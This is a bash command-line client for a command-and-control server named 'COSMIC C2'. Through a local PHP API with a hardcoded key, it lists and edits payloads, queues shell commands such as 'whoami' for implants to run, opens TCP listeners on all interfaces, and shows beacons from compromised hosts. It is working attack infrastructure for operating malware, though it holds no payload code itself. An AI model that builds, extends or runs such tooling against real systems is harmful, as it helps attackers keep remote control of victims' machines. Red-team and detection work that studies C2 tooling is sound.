#!/bin/bash
# COSMIC C2 CLI v2.0 – Professional Command & Control Administration
# Usage: ./c2-cli.sh [command] [options]

C2_API="http://localhost:8008/c2/api/index.php"
API_KEY="COSMIC-C2-SECRET-2026"

show_help() {
    cat << HELP
COSMIC C2 CLI – Admin Tool

Commands:
  payloads                         List all payloads
  payload delete <uuid>            Delete a payload
  payload update <uuid> <field=value> Update payload field (e.g., note="test")

  tasks [uuid]                    List tasks (all or for specific payload)
  task add <uuid> <command>       Add task to payload
  task delete <id>               Delete task by ID

  listeners                       List all listeners
  listener create <name> <port>   Create TCP listener on 0.0.0.0:<port>
  listener start <id>            Start listener
  listener stop <id>             Stop listener
  listener delete <id>           Delete listener

  beacons [uuid]                 Show recent beacons (all or per payload)
  stats                          Show C2 statistics
  help                           Show this help

Examples:
  ./c2-cli.sh payloads
  ./c2-cli.sh task add 550e8400-e29b-41d4-a716-446655440000 "whoami"
  ./c2-cli.sh listener create "WebListener" 8080
HELP
}

call_api() {
    local action=$1
    shift
    local params="action=$action&key=$API_KEY"
    local data=""
    
    # Build POST data from remaining args
    for arg in "$@"; do
        params="$params&$arg"
    done
    
    curl -s -X POST -d "$params" "$C2_API"
}

case $1 in
    payloads)
        call_api "list_payloads" | jq '.'
        ;;
    payload)
        case $2 in
            delete)
                call_api "delete_payload" "uuid=$3" | jq '.'
                ;;
            update)
                shift 3
                uuid=$2
                shift
                # Convert field=value to JSON
                data=$(printf '{%s}' $(echo "$*" | sed 's/\([^=]*\)=\([^ ]*\)/"\1":"\2"/g'))
                curl -s -X POST -H "Content-Type: application/json" -d "$data" "$C2_API?action=update_payload&uuid=$uuid&key=$API_KEY" | jq '.'
                ;;
            *)
                echo "Usage: payload delete <uuid> | payload update <uuid> field=value ..."
                ;;
        esac
        ;;
    tasks)
        if [ -n "$2" ]; then
            call_api "list_tasks" "uuid=$2" | jq '.'
        else
            call_api "list_tasks" | jq '.'
        fi
        ;;
    task)
        case $2 in
            add)
                call_api "add_task" "uuid=$3" "command=$4" | jq '.'
                ;;
            delete)
                call_api "delete_task" "id=$3" | jq '.'
                ;;
            *)
                echo "Usage: task add <uuid> <command> | task delete <id>"
                ;;
        esac
        ;;
    listeners)
        call_api "list_listeners" | jq '.'
        ;;
    listener)
        case $2 in
            create)
                call_api "create_listener" "name=$3" "lport=$4" "lhost=0.0.0.0" | jq '.'
                ;;
            start)
                call_api "start_listener" "id=$3" | jq '.'
                ;;
            stop)
                call_api "stop_listener" "id=$3" | jq '.'
                ;;
            delete)
                call_api "delete_listener" "id=$3" | jq '.'
                ;;
            *)
                echo "Usage: listener create <name> <port> | listener start|stop|delete <id>"
                ;;
        esac
        ;;
    beacons)
        if [ -n "$2" ]; then
            call_api "beacons" "uuid=$2" | jq '.'
        else
            call_api "beacons" | jq '.'
        fi
        ;;
    stats)
        call_api "stats" | jq '.'
        ;;
    help|*)
        show_help
        ;;
esac
